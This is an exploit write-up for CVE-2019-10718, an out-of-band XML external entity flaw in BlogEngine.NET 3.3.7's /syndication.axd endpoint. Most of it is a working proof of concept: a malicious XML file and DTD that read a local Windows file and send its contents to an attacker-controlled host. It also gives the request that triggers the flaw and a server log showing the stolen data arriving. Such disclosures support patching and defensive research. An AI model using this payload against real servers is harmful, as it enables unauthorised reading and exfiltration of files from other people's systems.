# Exploit Title: Out-of-band XML External Entity Injection on BlogEngine.NET
# Date: 19 June 2019
# Exploit Author: Aaron Bishop
# Vendor Homepage: https://blogengine.io/
# Version: v3.3.7
# Tested on: 3.3.7, 3.3.6
# CVE : 2019-10718

1. Description
==============

BlogEngine.NET is vulnerable to an Out-of-Band XML External Entity Injection attack on **/syndication.axd**.

2. Proof of Concept
=============

Host the following malicious XML on a web server that is accessible to the target system:

~~~{.xml command="oob.xml"}
xml = """<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://{lhost}:{lport}/ex.dtd">
<foo>&e1;</foo>
~~~

Host the following malicious DTD on a web server that is accessible to the target system:

~~~{.xml command="ex.dtd"}
<!ENTITY % p1 SYSTEM "file:///C:/Windows/win.ini">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://$LHOST/X?%p1;'>"> %p2
~~~

Submit a request to `syndication.axd` with the **apml** parameter referencing the malicious xml:

~~~
http://$RHOST/syndication.axd?apml=http://$LHOST/oob.xml
~~~

The application will request the XML, then the DTD, and submit a subsequent request containing the contents of the file:

~~~
$RHOST - - [13/Jun/2019 15:49:15] "GET /oob.xml HTTP/1.1" 200 -
$RHOST - - [13/Jun/2019 15:49:15] "GET /ex.dtd HTTP/1.1" 200 -
$RHOST - - [13/Jun/2019 15:49:15] "GET /X?;%20for%2016-bit%20app%20support%0D%0A[fonts]%0D%0A[extensions]%0D%0A[mci%20extensions]%0D%0A[files]%0D%0A[Mail]%0D%0AMAPI=1 HTTP/1.1" 200 -
~~~
